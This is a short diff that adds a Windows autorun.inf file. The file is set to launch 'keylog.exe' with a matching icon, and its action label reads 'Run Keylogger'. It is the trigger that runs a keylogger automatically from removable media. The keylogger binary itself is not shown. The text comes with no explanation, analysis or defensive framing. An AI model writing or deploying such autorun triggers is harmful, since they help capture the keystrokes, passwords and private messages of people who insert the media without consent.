@@ -1,0 +1,4 @@
+[autorun]
+open=keylog.exe
+icon=keylog.ico
+action=Run Keylogger
